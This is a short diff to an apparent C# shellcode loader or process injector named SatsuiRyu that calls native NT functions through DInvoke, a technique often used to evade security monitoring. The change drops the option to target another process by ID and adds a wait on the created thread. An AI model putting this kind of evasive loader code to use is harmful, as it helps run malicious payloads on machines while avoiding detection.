@@ -41,22 +41,7 @@ namespace SatsuiRyu
 
             DInvoke.Data.Native.OBJECT_ATTRIBUTES oa = new DInvoke.Data.Native.OBJECT_ATTRIBUTES();
 
-            IntPtr targetPid = IntPtr.Zero;
-
-            //Int32 pid = Process.GetCurrentProcess().Id;
-            Int32 pid = -1;
-            if(args.Length > 0){
-                int.TryParse(args[0], out pid);
-            } else {
-                //####FIND_PROCESS####
-            }
-            if (pid < 0)
-            {
-                Console.WriteLine("[-] Error: Process not found");
-                Environment.Exit(1);
-            }
-
-            targetPid = (IntPtr)pid;
+            IntPtr targetPid = (IntPtr)Process.GetCurrentProcess().Id;
 
             DInvoke.Data.Native.CLIENT_ID ci = new DInvoke.Data.Native.CLIENT_ID
             {
@@ -143,7 +128,24 @@ namespace SatsuiRyu
             pThread = (IntPtr)createThreadParams[0];
             ntdll.CheckNullPtr(pThread, "[-] Failed to start thread");
 
+            object[] waitForSingleObjectParams = {
+                pThread,
+                false,
+                0xFFFFFFFF
+            };
+
+            status =  ntdll.ChaseFunction("NtWaitForSingleObject",
+                                         typeof(NtWaitForSingleObject),
+                                         waitForSingleObjectParams);
+
         }
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate UInt32 NtWaitForSingleObject(
+            IntPtr ObjectHandle,
+            bool Alertable,
+            uint Timeout);
+
 
         internal class DLL
         {
